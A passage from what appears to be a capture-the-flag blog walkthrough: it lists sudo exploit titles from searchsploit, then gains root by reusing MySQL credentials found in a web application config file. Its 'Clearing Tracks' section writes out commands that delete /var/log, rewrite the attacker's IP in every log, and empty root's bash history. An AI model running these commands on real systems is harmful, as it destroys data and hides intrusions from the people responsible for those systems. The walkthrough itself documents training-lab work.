sudo 1.8.0 &lt; 1.8.3p1 - 'sudo_debug' glibc FORTIFY_SOURCE Bypass + Privilege Escalation | linux/local/25134.c
sudo 1.8.0 &lt; 1.8.3p1 - Format String                                                   | linux/dos/18436.txt
Sudo 1.8.14 (RHEL 5/6/7 / Ubuntu) - 'Sudoedit' Unauthorized Privilege Escalation       | linux/local/37710.txt
Sudo 1.8.20 - 'get_process_ttyname()' Local Privilege Escalation                       | linux/local/42183.c
Sudo 1.8.25p - 'pwfeedback' Buffer Overflow                                            | linux/local/48052.sh
Sudo 1.8.25p - 'pwfeedback' Buffer Overflow (PoC)                                      | linux/dos/47995.txt
sudo 1.8.27 - Security Bypass                                                          | linux/local/47502.py
Sudo 1.9.5p1 - 'Baron Samedit ' Heap-Based Buffer Overflow Privilege Escalation (1)    | multiple/local/49521.py
Sudo 1.9.5p1 - 'Baron Samedit ' Heap-Based Buffer Overflow Privilege Escalation (2)    | multiple/local/49522.c
Sudo Perl 1.6.x - Environment Variable Handling Security Bypass                        | linux/local/26498.txt
sudo.bin - NLSPATH Privilege Escalation                                                | linux/local/319.c
SudoEdit 1.6.8 - Local Change Permission                                               | linux/local/470.c
ZPanel zsudo - Local Privilege Escalation (Metasploit)                                 | linux/local/26451.rb
---------------------------------------------------------------------------------------- -------------------------
--------------------------------------------------------------------------------------------------------------- ----------------------
 Shellcode Title                                                                                              |  Path
--------------------------------------------------------------------------------------------------------------- ----------------------
Linux/x86 - chmod 777 /etc/sudoers Shellcode (36 bytes)                                                       | linux_x86/43463.nasm
Linux/x86 - Edit /etc/sudoers (ALL ALL=(ALL) NOPASSWD: ALL) For Full Access + Null-Free Shellcode (79 bytes)  | linux_x86/44507.c
Linux/x86 - Edit /etc/sudoers (ALL ALL=(ALL) NOPASSWD: ALL) For Full Access Shellcode (86 bytes)              | linux_x86/13331.c
--------------------------------------------------------------------------------------------------------------- ----------------------
</pre></table></code></div></div><p><em>Also see: <a href="./searchsploit-sudo.log">searchsploit-sudo.log</a></em></p><p>I went through several of these, but ultimately didn’t get any working. Moving on, and knowing this is a PHP website, we can look over in <code class="language-plaintext highlighter-rouge">/var/www/html/fuel/application/</code> and check out the configuration. In this file:</p><blockquote><p><strong><code class="language-plaintext highlighter-rouge">/var/www/html/fuel/application/config/database.php</code></strong></p></blockquote><p>We have the MySQL <code class="language-plaintext highlighter-rouge">root</code> credentials. Just to see, maybe this is the same password for <code class="language-plaintext highlighter-rouge">root</code> on this box. We run:</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>su
</pre></table></code></div></div><p>Then use the password from that <code class="language-plaintext highlighter-rouge">database.php</code> above, and we have a root prompt. Go get your THM flag from <code class="language-plaintext highlighter-rouge">/root/root.txt</code>.</p><h2 id="more-exploration"><span class="me-2">More Exploration…</span><a href="#more-exploration" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>It’s not needed to complete this room, but for practice, you currently have a limited bash prompt, but you have root, plus you have the mySQL<code class="language-plaintext highlighter-rouge">root</code> credentials in: <code class="language-plaintext highlighter-rouge">/var/www/html/fuel/application/config/database.php</code>. It might be an interesting exercise to practice your Advanced Persistent Threat techniques to quietly gain your own access.</p><p>Also, it might be fun to get familiar with exploring mySQL from the command line, and exfiltrating data too. In this case, this is a pretty empty database, but it’s a realistic environment to hone those skills.</p><h2 id="maintaining-access"><span class="me-2">Maintaining Access</span><a href="#maintaining-access" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>None needed.</p><h2 id="clearing-tracks"><span class="me-2">Clearing Tracks</span><a href="#clearing-tracks" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>This is a test machine. However, in a Red Team scenario, we might:</p><h3 id="delete-relevant-logs-from-varlog---although-that-is-loud-destructive-and-might-draw-attention"><span class="me-2">Delete relevant logs from <code class="language-plaintext highlighter-rouge">/var/log/</code> - although that is loud, destructive, and might draw attention.</span><a href="#delete-relevant-logs-from-varlog---although-that-is-loud-destructive-and-might-draw-attention" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><blockquote><p><code class="language-plaintext highlighter-rouge">rm -Rf /var/log/*</code></p></blockquote><h3 id="instead-consider-doing-a-search-and-replace-of-our-ip-address-in-all-logs-via"><span class="me-2">Instead, consider doing a search and replace of our IP address in all logs via:</span><a href="#instead-consider-doing-a-search-and-replace-of-our-ip-address-in-all-logs-via" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><blockquote><p><code class="language-plaintext highlighter-rouge">find /var/log -name "*" -exec sed -i 's/10.2.110.212/127.0.0.1/g' {} \;</code></p></blockquote><h3 id="wipe-bash-history-for-any-accounts-we-used-via"><span class="me-2">Wipe bash history for any accounts we used via:</span><a href="#wipe-bash-history-for-any-accounts-we-used-via" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><blockquote><p><code class="language-plaintext highlighter-rouge">cat /dev/null &gt; /root/.bash_history</code></p></blockquote><h2 id="summary"><span class="me-2">Summary</span><a href="#summary" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>Completed: [2022-02-11 23:48:52]</p></div></div></div><div id="panel-wrapper" class="col-xl-3 ps-2 text-muted"><div class="access"><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 me-3"> <a class="post-tag btn btn-outline-primary" href="/tags/chirpy/">chirpy</a> <a class="post-tag btn btn-outline-primary" href="/tags/documentation/">documentation</a> <a class="post-tag btn btn-outline-primary" href="/tags/jekyll/">jekyll</a> <a class="post-tag btn btn-outline-primary" href="/tags/techno-tim/">techno-tim</a></div></div></div></div></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-11 post-content"><div id="search-hints"><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 me-3"> <a class="post-tag btn btn-outline-primary" href="/tags/chirpy/">chirpy</a> <a class="post-tag btn btn-outline-primary" href="/tags/documentation/">documentation</a> <a class="post-tag btn btn-outline-primary" href="/tags/jekyll/">jekyll</a> <a class="post-tag btn btn-outline-primary" href="/tags/techno-tim/">techno-tim</a></div></div></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div></div><footer><div class="container px-lg-4"><div class="d-flex justify-content-center align-items-center text-muted mx-md-3"><p>Using the <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> theme <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a></p><p>© 2023 <a href="https://github.com/r0bsec">r0bsec</a>. <span data-bs-toggle="tooltip" data-bs-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author." >Some rights reserved.</span></p></div></div></footer><div id="mask"></div><button id="back-to-top" aria-label="back-to-top" class="btn btn-lg btn-box-shadow"> <i class="fas fa-angle-up"></i> </button><div id="notification" class="toast" role="alert" aria-live="assertive" aria-atomic="true" data-bs-animation="true" data-bs-autohide="false" ><div class="toast-header"> <button type="button" class="btn-close ms-auto" data-bs-dismiss="toast" aria-label="Close" ></button></div><div class="toast-body text-center pt-0"><p class="px-2 mb-3">A new version of content is available.</p><button type="button" class="btn btn-primary" aria-label="Update"> Update </button></div></div><script src="https://cdn.jsdelivr.net/combine/npm/jquery@3.7.0/dist/jquery.min.js,npm/bootstrap@5.2.3/dist/js/bootstrap.bundle.min.js,npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js,npm/lazysizes@5.3.2/lazysizes.min.js,npm/magnific-popup@1.1.0/dist/jquery.magnific-popup.min.js,npm/clipboard@2.0.11/dist/clipboard.min.js,npm/tocbot@4.21.0/dist/tocbot.min.js"></script> <script defer src="/assets/js/dist/page.min.js"></script> <script defer src="/app.js"></script> <script> /* Note: dependent library will be loaded in `js-selector.html` */ SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="px-1 px-sm-2 px-lg-4 px-xl-0"> <a href="{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5"></p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="me-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script>
